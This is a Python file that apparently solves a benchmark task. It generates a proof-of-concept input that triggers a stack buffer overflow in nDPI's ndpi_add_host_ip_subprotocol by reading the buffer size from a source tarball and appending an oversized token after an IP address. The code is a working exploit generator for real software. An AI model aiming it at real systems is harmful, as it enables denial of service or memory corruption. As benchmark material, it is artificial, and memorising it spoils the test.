import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in ndpi_add_host_ip_subprotocol.
        The vulnerability is a stack overflow in the 'tail' buffer when parsing a rule line.
        """
        tail_size = 16  # Default size based on vulnerability details (CVE-2021-36082 context)

        try:
            # Attempt to extract the exact buffer size from the source code
            with tarfile.open(src_path, 'r') as tar:
                # Find the ndpi_main.c file in the tarball
                target_member = None
                for member in tar.getmembers():
                    if member.name.endswith('ndpi_main.c'):
                        target_member = member
                        break
                
                if target_member:
                    f = tar.extractfile(target_member)
                    content = f.read().decode('utf-8', errors='ignore')
                    
                    # Locate the vulnerable function
                    func_name = "ndpi_add_host_ip_subprotocol"
                    start_idx = content.find(func_name)
                    
                    if start_idx != -1:
                        # Search for the declaration of 'tail' within the function's scope
                        # Limit the search window to avoid false positives elsewhere
                        scope = content[start_idx:start_idx+2000]
                        # Regex to match 'char tail[NUMBER]' or 'char tail [ NUMBER ]'
                        match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', scope)
                        if match:
                            tail_size = int(match.group(1))
        except Exception:
            # Fallback to default if source extraction fails
            pass
            
        # Construct the PoC payload
        # The function parses a line formatted roughly as "<IP> <PROTOCOL_NAME>"
        # vulnerability occurs when the second token overflows 'tail'.
        
        # First part: A valid-looking IP address to satisfy initial parsing
        ip_part = b"1.1.1.1 "
        
        # Second part: The overflow string
        # sscanf with %s will write the input string + null terminator.
        # Any string length >= tail_size will cause an out-of-bounds write (at least the null byte).
        # Ground truth is 56 bytes. "1.1.1.1 " is 8 bytes. Remaining is 48 bytes.
        # If tail_size is 16, 48 bytes is tail_size + 32. This provides a strong overflow.
        overflow_len = tail_size + 32
        
        payload = ip_part + b"A" * overflow_len
        
        return payload